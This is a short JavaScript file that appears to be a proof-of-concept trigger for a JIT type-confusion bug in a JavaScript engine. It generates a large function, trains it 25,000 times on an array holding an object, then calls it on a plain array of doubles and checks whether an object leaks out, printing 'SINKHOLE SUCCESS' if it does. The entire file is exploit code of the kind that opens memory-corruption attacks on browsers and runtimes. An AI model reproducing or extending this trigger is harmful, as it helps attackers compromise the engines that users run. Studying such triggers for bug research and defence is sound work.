const N_BLOCKS = 650;
const lines = ["function trigger(x, arr, obj, limit) {"];
for (let i = 0; i < N_BLOCKS; i++) {
  lines.push(`  if (x === ${i}) return ${i};`);
}
lines.push(`
  let i = 0;
  let res = 0;
  while (i < limit && (arr[0] = obj, true)) {
    res = arr[1];
    i++;
  }
  return res;
}`);
lines.push("return trigger;");
const trigger = new Function(lines.join("\n"))();

const obj = {marker: 1};
for (let i = 0; i < 20; i++) {
  trigger(1000, [1.1, 2.2, 3.3], obj, 1);
}
const stable = [obj, 2.2, 3.3];
for (let i = 0; i < 25000; i++) {
  trigger(i, stable, obj, 1);
}
console.log("warmup complete");
setTimeout(() => {
  const victim = [1.1, 2.2, 3.3];
  const result = trigger(1000, victim, obj, 1);
  console.log("result", typeof result, result, "victim0", typeof victim[0], victim[0]);
  if (typeof result === "object") console.log("SINKHOLE SUCCESS", result);
}, 2000);

